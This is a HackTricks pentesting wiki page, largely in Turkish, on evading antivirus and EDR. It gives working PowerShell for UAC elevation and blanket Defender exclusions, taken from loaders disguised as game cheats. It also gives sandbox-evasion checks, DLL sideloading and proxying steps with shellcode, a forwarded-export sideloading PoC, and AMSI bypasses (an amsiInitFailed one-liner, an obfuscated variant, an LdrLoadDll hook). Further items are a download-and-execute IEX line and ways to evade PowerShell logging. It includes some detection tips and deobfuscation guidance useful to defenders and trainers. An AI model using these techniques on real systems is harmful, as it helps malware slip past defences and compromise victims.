# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Bu sayfa** [**@m2rc_p**](https://twitter.com/m2rc_p)** tarafından yazıldı!**

## Defender'ı Durdurma

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender'ın çalışmasını durdurmak için bir araç.
- [no-defender](https://github.com/es3n1n/no-defender): Başka bir AV'yi taklit ederek Windows Defender'ın çalışmasını durdurmak için bir araç.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Defender ile uğraşmadan önce yükleyici tarzı UAC tuzağı

Oyun hileleri kılığındaki halka açık loader'lar sıklıkla imzasız Node.js/Nexe installer'ları olarak gelir; önce **kullanıcıdan yükseltme isterler** ve ancak sonra Defender'ı etkisiz hâle getirirler. Akış basittir:

1. `net session` ile yönetici bağlamını kontrol eder. Komut yalnızca çağıranın yönetici haklarına sahip olduğu durumda başarılı olur, bu yüzden başarısızlık loader'ın standart kullanıcı olarak çalıştığını gösterir.
2. Orijinal komut satırını korurken beklenen UAC onay istemini tetiklemek için hemen kendisini `RunAs` verb'iyle yeniden başlatır.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Mağdurlar zaten “cracked” yazılım kurduklarına inandıkları için istem genellikle kabul edilir; bu da malware'e Defender’ın politikasını değiştirmek için gereken yetkileri verir.

### Her sürücü harfi için toplu `MpPreference` hariç tutmaları

Yükseltilince, GachiLoader-style zincirleri servisi tamamen devre dışı bırakmak yerine Defender'ın kör noktalarını maksimuma çıkarır. Loader önce GUI watchdog'u öldürür (`taskkill /F /IM SecHealthUI.exe`) ve ardından tüm kullanıcı profilleri, sistem dizinleri ve çıkarılabilir disklerin taranamaz hale gelmesi için **son derece geniş hariç tutmalar** ekler:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Key observations:

- Döngü her bağlanmış dosya sisteminde (D:\, E:\, USB bellekler, vb.) dolaşır, bu yüzden disk üzerinde gelecekte herhangi bir yere bırakılacak olan herhangi bir payload **yoksayılır**.
- `.sys` uzantısı hariç tutulması ileriye dönük—saldırganlar daha sonra Defender'ı tekrar tetiklemeden imzasız driver yükleme seçeneğini saklı tutar.
- Tüm değişiklikler `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` altında toplanır; bu sayede sonraki aşamalar eksikliklerin devam ettiğini doğrulayabilir veya Defender'ı yeniden tetiklemeden bunları genişletebilir.

Hiçbir Defender servisi durdurulmadığı için, yüzeysel sağlık kontrolleri “antivirus active” raporlamaya devam eder, oysa gerçek zamanlı inceleme bu yolları hiç kontrol etmez.

## **AV Kaçınma Metodolojisi**

Currently, AVs use different methods for checking if a file is malicious or not, static detection, dynamic analysis, and for the more advanced EDRs, behavioural analysis.

### **Static detection**

Static detection, bir binary veya script içindeki bilinen kötü amaçlı stringleri veya byte dizilerini işaretleyerek ve ayrıca dosyanın kendisinden bilgi çıkararak (örn. file description, company name, digital signatures, icon, checksum, vb.) gerçekleştirilir. Bu, bilinen kamu araçlarını kullanmanın sizi daha kolay yakalayabileceği anlamına gelir; çünkü muhtemelen analiz edilmiş ve kötü amaçlı olarak işaretlenmişlerdir. Bu tür tespitten kaçınmanın birkaç yolu vardır:

- **Encryption**

Binary'yi şifrelerseniz, AV programınızın programınızı tespit etmesinin bir yolu kalmaz, ancak programı bellekte decrypt edip çalıştırmak için bir tür loader'a ihtiyacınız olacaktır.

- **Obfuscation**

Bazen tek yapmanız gereken binary veya script içindeki bazı stringleri değiştirmektir, ancak bu, neyi obfuscate etmeye çalıştığınıza bağlı olarak zaman alıcı olabilir.

- **Custom tooling**

Kendi araçlarınızı geliştirirseniz, bilinen kötü imzalar olmayacaktır, ancak bu çok zaman ve çaba gerektirir.

> [!TIP]
> Windows Defender'ın static tespitine karşı kontrol etmek için iyi bir yol ThreatCheck'tir. Bu araç dosyayı birden fazla segmente böler ve Defender'a her birini ayrı ayrı taratır; bu sayede binary'nizde hangi stringlerin veya byte'ların işaretlendiğini tam olarak söyleyebilir.

Pratik AV Evasion hakkında bu YouTube playlist'ini izlemenizi şiddetle tavsiye ederim.

### **Dynamic analysis**

Dynamic analysis, AV'nin binary'nizi bir sandbox içinde çalıştırıp kötü amaçlı aktiviteleri izlemesidir (örn. tarayıcı şifrelerini decrypt edip okumaya çalışmak, LSASS üzerinde minidump almak, vb.). Bu kısımla çalışmak biraz daha zor olabilir, ama sandbox'lardan kaçmak için yapabileceğiniz bazı şeyler şunlardır.

- **Sleep before execution** Uygulanış biçimine bağlı olarak, bu AV'nin dynamic analysis'ini atlatmak için harika bir yol olabilir. AV'lerin kullanıcı akışını kesmemek için dosyaları taramak için çok kısa bir süreleri vardır, bu yüzden uzun uyumalar (sleep) binarylerin analizini bozabilir. Sorun şu ki, birçok AV'nin sandbox'ı sleep'i atlayabilir uygulama biçimine bağlı olarak.
- **Checking machine's resources** Genellikle Sandbox'ların çalışacak çok az kaynağı vardır (örn. < 2GB RAM), aksi takdirde kullanıcının makinesini yavaşlatabilirler. Burada çok yaratıcı olabilirsiniz; örneğin CPU sıcaklığını veya fan hızlarını kontrol etmek gibi; her şey sandbox'ta uygulanmış olmayacaktır.
- **Machine-specific checks** Hedeflediğiniz kullanıcının workstation'ı "contoso.local" domain'ine bağlıysa, bilgisayarın domain'inde hedeflediğinizle eşleşip eşleşmediğini kontrol edebilirsiniz; eşleşmiyorsa programınızı çıkacak şekilde tasarlayabilirsiniz.

Microsoft Defender'ın Sandbox bilgisayar adının HAL9TH olduğu ortaya çıktı; bu yüzden malware'inizde detonate etmeden önce bilgisayar adını kontrol edebilirsiniz. Eğer ad HAL9TH ile eşleşiyorsa, Defender'ın sandbox'ındasınız demektir ve programınızı kapatabilirsiniz.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>kaynak: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandboxes'a karşı gitmek için @mgeeky'den bazı diğer çok iyi ipuçları

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Daha önce de söylediğimiz gibi, **public tools** er ya da geç **detect edilir**, bu yüzden kendinize şu soruyu sormalısınız:

Örneğin, LSASS'i dumplamak istiyorsanız, gerçekten mimikatz kullanmanız mı gerekiyor? Yoksa daha az bilinen ve LSASS'i dumplayan farklı bir proje kullanabilir misiniz?

Doğru cevap muhtemelen ikincisidir. Mimikatz örneğini ele alırsak, muhtemelen AV'ler ve EDR'ler tarafından en çok işaretlenen zararlı yazılımlardan biridir; proje kendisi süper havalı olsa da, AV'lerden kaçmak için onunla çalışmak bir kabusa dönüşebilir, bu yüzden başarmaya çalıştığınız iş için alternatiflere bakın.

> [!TIP]
> Payload'larınızı evasion için değiştirirken, Defender'da **automatic sample submission'ı kapattığınızdan** emin olun ve lütfen, cidden, **VIRUSTOTAL'A YÜKLEMEYİNİZ** eğer uzun vadede evasion elde etmeyi hedefliyorsanız. Bir payload'ın belirli bir AV tarafından tespit edilip edilmediğini kontrol etmek istiyorsanız, onu bir VM'e kurun, automatic sample submission'ı kapatmayı deneyin ve memnun kalana kadar orada test edin.

## EXEs vs DLLs

Mümkün olduğunda, her zaman **DLL'leri evasion için önceliklendirin**, benim tecrübeme göre DLL dosyaları genellikle **çok daha az tespit edilir** ve analiz edilir; bu yüzden payload'ınızın DLL olarak çalıştırılabilme yolu varsa, tespiti önlemek için kullanabileceğiniz çok basit bir hiledir.

Bu görselde görebileceğimiz gibi, Havoc'tan bir DLL Payload antiscan.me'de 4/26 tespit oranına sahipken, EXE payload 7/26 tespit oranına sahip.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Şimdi DLL dosyalarıyla çok daha gizli olmanızı sağlayacak bazı hileleri göstereceğiz.

## DLL Sideloading & Proxying

**DLL Sideloading**, loader tarafından kullanılan DLL arama sırasından faydalanarak, hem victim uygulamayı hem de kötü amaçlı payload(lar)ı birbirlerinin yanına konumlandırmayı kullanır.

DLL Sideloading'e duyarlı programları Siofra kullanarak ve aşağıdaki powershell script ile kontrol edebilirsiniz:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Bu komut, "C:\Program Files\\" içindeki DLL hijacking'e açık programların listesini ve yüklemeye çalıştıkları DLL dosyalarını yazdırır.

Kendi başınıza **DLL Hijackable/Sideloadable programs** keşfetmenizi şiddetle tavsiye ederim; bu teknik doğru yapıldığında oldukça stealthy'dir, ancak kamuya mal olmuş DLL Sideloadable programları kullanırsanız, kolayca yakalanabilirsiniz.

Bir programın yüklemeyi beklediği isimde zararlı bir DLL yerleştirmek tek başına payload'unuzu çalıştırmaz; çünkü program o DLL içinde bazı spesifik fonksiyonlar bekler. Bu sorunu çözmek için **DLL Proxying/Forwarding** adlı başka bir teknik kullanacağız.

**DLL Proxying** bir programın proxy (ve zararlı) DLL'den yaptığı çağrıları orijinal DLL'e iletir; böylece programın işlevselliği korunur ve payload'unuzun yürütülmesini ele alabilir.

Bu amaçla [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) projesini [@flangvik](https://twitter.com/Flangvik/) tarafından kullanacağım.

Takip ettiğim adımlar şunlardır:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Son komut bize 2 dosya verecek: bir DLL kaynak kodu şablonu ve yeniden adlandırılmış orijinal DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
These are the results:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Hem shellcode'umuz (encoded with [SGN](https://github.com/EgeBalci/sgn)) hem de proxy DLL'imiz [antiscan.me](https://antiscan.me) üzerinde 0/26 tespit oranına sahip! Bunu başarı sayarım.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> İzlemenizi **şiddetle öneririm**: [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) DLL Sideloading hakkında ve ayrıca tartıştıklarımızı daha derinlemesine öğrenmek için [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) 'yu izleyin.

### Forwarded Exports'ı Kötüye Kullanma (ForwardSideLoading)

Windows PE modülleri gerçekte "forwarders" olan fonksiyonları export edebilir: kodu işaret etmek yerine, export girdisi `TargetDll.TargetFunc` biçiminde bir ASCII dizesi içerir. Bir çağırıcı export'u çözdüğünde, Windows loader şunları yapacaktır:

- Eğer yüklenmemişse `TargetDll`'i yükler
- Ondan `TargetFunc`'i çözer

Anlaşılması gereken temel davranışlar:
- Eğer `TargetDll` bir KnownDLL ise, korumalı KnownDLLs ad alanından sağlanır (ör. ntdll, kernelbase, ole32).
- Eğer `TargetDll` bir KnownDLL değilse, normal DLL arama sırası kullanılır; bu sıra, forward çözümlemesini yapan modülün dizinini de içerir.

Bu, dolaylı bir sideloading primitive'i sağlar: bir fonksiyonu non-KnownDLL bir modül adına forward eden imzalı bir DLL bulun; sonra bu imzalı DLL'i, forward edilen hedef modülle tam olarak aynı ada sahip, saldırgan tarafından kontrol edilen bir DLL ile aynı dizine koyun. Forward edilen export çağrıldığında, loader forward'ı çözecek ve aynı dizinden sizin DLL'inizi yükleyerek DllMain'inizi çalıştıracaktır.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` bir KnownDLL değil, bu yüzden normal arama sırasına göre çözülür.

PoC (copy-paste):
1) İmzalı sistem DLL'ini yazılabilir bir klasöre kopyalayın
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Aynı klasöre kötü amaçlı `NCRYPTPROV.dll` bırakın. Minimal bir DllMain, kod yürütmeyi sağlamak için yeterlidir; DllMain'i tetiklemek için forwarded function'ı uygulamanıza gerek yoktur.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) İmzalı bir LOLBin ile yönlendirmeyi tetikleyin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (signed) side-by-side `keyiso.dll` (signed) yükler
- `KeyIsoSetAuditingInterface` çözümlenirken, loader forward'ı `NCRYPTPROV.SetAuditingInterface`'e takip eder
- loader daha sonra `C:\test`'ten `NCRYPTPROV.dll` yükler ve `DllMain`'ini çalıştırır
- Eğer `SetAuditingInterface` uygulanmamışsa, `DllMain` zaten çalıştıktan sonra ancak "missing API" hatası alırsınız

Hunting tips:
- Hedef modül KnownDLL olmayan forwarded exports'lara odaklanın. KnownDLLs şurada listelenir: `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Forwarded exports'ları şu tür araçlarla listeleyebilirsiniz:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Windows 11 forwarder envanterine bakarak adayları arayın: https://hexacorn.com/d/apis_fwd.txt

Tespit/savunma fikirleri:
- Monitor LOLBins (e.g., rundll32.exe) loading signed DLLs from non-system paths, followed by loading non-KnownDLLs with the same base name from that directory
- Kullanıcı tarafından yazılabilir yollar altında, `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` gibi işlem/modül zincirleri için alarm oluşturun
- Kod bütünlüğü politikalarını (WDAC/AppLocker) uygulayın ve uygulama dizinlerinde yazma+çalıştırma izinlerini reddedin

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Freeze'i, shellcode'unuzu gizli bir şekilde yükleyip çalıştırmak için kullanabilirsiniz.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion sadece bir kedi ve fare oyunu: bugün işe yarayan yarın tespit edilebilir, bu yüzden yalnızca tek bir araca güvenmeyin; mümkünse birden fazla evasion tekniğini zincirleyin.

## AMSI (Anti-Malware Scan Interface)

AMSI, "fileless malware"ı önlemek için oluşturuldu. Başlangıçta AV'ler yalnızca diskteki **dosyaları tarayabiliyordu**, bu yüzden payload'ları **in-memory** doğrudan çalıştırmayı başarırsanız, AV'nin yeterli görünürlüğü olmadığı için müdahale edemiyordu.

AMSI özelliği Windows'un şu bileşenlerine entegre edilmiştir:

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Bu, antivirus çözümlerinin script içeriğini şifresiz ve unobfuscated bir biçimde açığa çıkararak script davranışını incelemesine olanak tanır.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Dikkat edin nasıl `amsi:` ile öne ekliyor ve ardından script'in çalıştığı executable yolunu gösteriyor; bu örnekte powershell.exe

Hiçbir dosyayı diske bırakmadık, ama AMSI yüzünden yine de in-memory yakalandık.

Dahası, **.NET 4.8** itibarıyla C# kodu da AMSI üzerinden çalıştırılıyor. Bu, `Assembly.Load(byte[])` ile in-memory yüklemeyi bile etkiliyor. Bu yüzden AMSI'den kaçınmak istiyorsanız in-memory yürütme için daha düşük .NET sürümleri (ör. 4.7.2 veya altı) kullanılması önerilir.

AMSI'den kaçmanın birkaç yolu vardır:

- **Obfuscation**

AMSI çoğunlukla statik tespitlerle çalıştığı için, yüklemeye çalıştığınız scriptleri değiştirmek detection'dan kaçmak için iyi bir yol olabilir.

Ancak AMSI, scriptleri birden fazla katman olsa bile unobfuscate etme yeteneğine sahiptir; bu nedenle obfuscation nasıl yapıldığına bağlı olarak kötü bir seçenek olabilir. Bu da kaçışı kolay bir iş olmaktan çıkarır. Yine de bazen yapmanız gereken tek şey birkaç değişken adını değiştirmektir; duruma bağlı olarak değişir.

- **AMSI Bypass**

AMSI, powershell (ayrıca cscript.exe, wscript.exe vb.) sürecine bir DLL yüklenerek uygulanır; bu nedenle, ayrılcalıksız bir kullanıcı olarak bile bunu kolayca müdahale etmek mümkündür. AMSI uygulamasındaki bu kusur nedeniyle, araştırmacılar AMSI taramasından kaçmak için birden fazla yol buldular.

**Forcing an Error**

AMSI başlangıç işleminin başarısız olmasını zorlamak (amsiInitFailed) mevcut süreç için hiçbir taramanın başlatılmamasıyla sonuçlanır. Bu ilk olarak [Matt Graeber](https://twitter.com/mattifestation) tarafından ifşa edildi ve Microsoft daha geniş kullanımını önlemek için bir signature geliştirdi.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Mevcut powershell işlemi için AMSI'yi kullanılamaz hale getirmek sadece tek bir powershell satırı aldı. Bu satır elbette AMSI tarafından tespit edildi, bu yüzden bu tekniği kullanmak için bazı değişiklikler gerekiyor.

İşte aldığım ve değiştirdiğim AMSI bypass: [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Unutmayın: bu gönderi yayınlandığında muhtemelen işaretlenecektir; tespit edilmeden kalmayı planlıyorsanız hiçbir code yayımlamamalısınız.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Daha ayrıntılı bir açıklama için lütfen [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) okuyun.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### amsi.dll'in yüklenmesini engelleyerek AMSI'yi bloke etme (LdrLoadDll hook)

AMSI yalnızca `amsi.dll` mevcut işleme yüklendikten sonra başlatılır. Dil‑bağımsız, sağlam bir bypass yöntemi, istenen modül `amsi.dll` olduğunda hata döndüren bir user‑mode hook'u `ntdll!LdrLoadDll` üzerine yerleştirmektir. Sonuç olarak, AMSI asla yüklenmez ve o işlem için tarama gerçekleşmez.

Uygulama taslağı (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notlar
- PowerShell, WScript/CScript ve custom loaders gibi AMSI'yi yükleyecek her şeyde çalışır.
- Uzun komut satırı artefaktlarından kaçınmak için script'leri stdin üzerinden beslemeyle birlikte kullanın (`PowerShell.exe -NoProfile -NonInteractive -Command -`).
- LOLBins aracılığıyla çalıştırılan loaders tarafından kullanıldığı görülmüştür (ör. `regsvr32` `DllRegisterServer` çağırıyor).

The tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** also generates script to bypass AMSI.
The tool **[https://amsibypass.com/](https://amsibypass.com/)** also generates script to bypass AMSI that avoid signature by randomized user-defined function, variables, characters expression and applies random character casing to PowerShell keywords to avoid signature.

**Tespit edilen imzayı kaldırın**

Mevcut işlemin hafızasındaki tespit edilmiş AMSI imzasını kaldırmak için **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** ve **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** gibi araçları kullanabilirsiniz. Bu araç, mevcut işlemin hafızasında AMSI imzasını tarar ve ardından onu NOP talimatlarıyla üzerine yazarak hafızadan etkili şekilde kaldırır.

**AMSI kullanan AV/EDR ürünleri**

AMSI kullanan AV/EDR ürünlerinin bir listesini **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** adresinde bulabilirsiniz.

**PowerShell sürüm 2'yi kullanın**
PowerShell sürüm 2'yi kullanırsanız, AMSI yüklenmez; bu yüzden script'lerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Bunu şöyle yapabilirsiniz:
```bash
powershell.exe -version 2
```
## PS Günlüğü

PowerShell logging, bir sistemde çalıştırılan tüm PowerShell komutlarını kaydetmenizi sağlayan bir özelliktir. Bu, denetim ve sorun giderme amaçları için faydalı olabilir, ancak tespitten kaçınmak isteyen saldırganlar için de bir **sorun** teşkil edebilir.

PowerShell logging'i atlamak için şu teknikleri kullanabilirsiniz:

- **PowerShell Transcription ve Module Logging'i Devre Dışı Bırakın**: Bu amaçla [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) gibi bir araç kullanabilirsiniz.
- **Powershell sürüm 2 kullanın**: PowerShell sürüm 2 kullanırsanız, AMSI yüklenmeyecektir; böylece betiklerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Bunu şu şekilde yapabilirsiniz: `powershell.exe -version 2`
- **Unmanaged Powershell Oturumu kullanın**: savunmalardan arındırılmış bir powershell başlatmak için [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kullanın (bu, Cobal Strike'dan `powerpick`'in kullandığı şeydir).


## Obfuskasyon

> [!TIP]
> Birçok obfuskasyon tekniği veriyi şifrelemeye dayanır; bu, ikili dosyanın entropisini artırır ve AVs ile EDRs tarafından tespit edilmesini kolaylaştırır. Bununla dikkatli olun ve şifrelemeyi yalnızca hassas veya gizlenmesi gereken kod bölümlerine uygulamayı düşünün.

### ConfuserEx ile Korunan .NET İkili Dosyalarının Deobfuskasyonu

ConfuserEx 2 (veya ticari çatalları) kullanan bir malware analiz ederken, derleyicileri ve sandbox'ları engelleyen birkaç koruma katmanıyla karşılaşmak yaygındır. Aşağıdaki iş akışı, daha sonra dnSpy veya ILSpy gibi araçlarda C#'a decompile edilebilecek neredeyse orijinal IL'yi güvenilir şekilde **geri kazandırır**.

1.  Anti-tampering kaldırma – ConfuserEx her *method body*'yi şifreler ve bunları *module* statik constructor'ında (`<Module>.cctor`) çözer. Bu aynı zamanda PE checksum'u yamalar, bu yüzden herhangi bir değişiklik binary'nin çökmesine neden olur. Şifrelenmiş metadata tablolarını bulmak, XOR anahtarlarını kurtarmak ve temiz bir assembly yeniden yazmak için **AntiTamperKiller** kullanın:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Çıktı, kendi unpacker'ınızı oluştururken faydalı olabilecek 6 anti-tamper parametresini (`key0-key3`, `nameHash`, `internKey`) içerir.

2.  Sembol / kontrol akışı kurtarma – *clean* dosyayı **de4dot-cex**'e (ConfuserEx farkında olan de4dot çatallaması) verin.
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – ConfuserEx 2 profilini seçer  
• de4dot, control-flow flattening'i geri alır, orijinal namespace'leri, sınıfları ve değişken isimlerini geri getirir ve sabit string'leri çözer.

3.  Proxy-call kaldırma – ConfuserEx, decompilation'u daha da bozmak için doğrudan method çağrılarını hafif sarıcılarla (*proxy calls*) değiştirir. Bunları **ProxyCall-Remover** ile kaldırın:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Bu adımdan sonra şeffaf wrapper fonksiyonlar (`Class8.smethod_10`, …) yerine `Convert.FromBase64String` veya `AES.Create()` gibi normal .NET API'lerini görmelisiniz.

4.  Manuel temizleme – ortaya çıkan binary'yi dnSpy altında çalıştırın, büyük Base64 blob'ları veya `RijndaelManaged`/`TripleDESCryptoServiceProvider` kullanımını arayarak *gerçek* payload'ı bulun. Genellikle malware bunu `<Module>.byte_0` içinde başlatılmış TLV-encoded bir byte array olarak saklar.

Yukarıdaki zincir, kötü amaçlı örneği çalıştırma gerekmeksizin yürütme akışını geri kazandırır — çevrimdışı bir iş istasyonunda çalışırken faydalıdır.

> 🛈  ConfuserEx, `ConfusedByAttribute` adında özel bir attribute üretir; bu, örneklerin otomatik triage'ı için bir IOC olarak kullanılabilir.

#### Tek satır
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Bu projenin amacı, yazılım güvenliğini code obfuscation ve tamper-proofing yoluyla artırabilen [LLVM](http://www.llvm.org/) derleme paketinin açık kaynak bir fork'unu sağlamaktır.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator, `C++11/14` dilini kullanarak derleme zamanında harici bir araç kullanmadan ve derleyiciyi değiştirmeden obfuscated kod üretmeyi göstermektedir.
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming çerçevesi tarafından üretilen obfuscated işlemler katmanı ekleyerek uygulamayı kırmak isteyen kişinin işini biraz daha zorlaştırır.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz, .exe, .dll, .sys dahil olmak üzere çeşitli PE dosyalarını obfuscate edebilen bir x64 binary obfuscator'tır.
- [**metame**](https://github.com/a0rtega/metame): Metame, arbitrary executables için basit bir metamorphic code engine'dir.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator, ROP (return-oriented programming) kullanarak LLVM tarafından desteklenen diller için ince taneli bir code obfuscation çerçevesidir. ROPfuscator, normal talimatları ROP zincirlerine dönüştürerek bir programı assembly kod düzeyinde obfuscate eder ve normal kontrol akışına dair doğal algımızı bozmayı hedefler.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt, Nim ile yazılmış bir .NET PE Crypter'dır.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor, mevcut EXE/DLL dosyalarını shellcode'a dönüştürebilir ve ardından bunları yükleyebilir.

## SmartScreen & MoTW

You may have seen this screen when downloading some executables from the internet and executing them.

Microsoft Defender SmartScreen is a security mechanism intended to protect the end user against running potentially malicious applications.

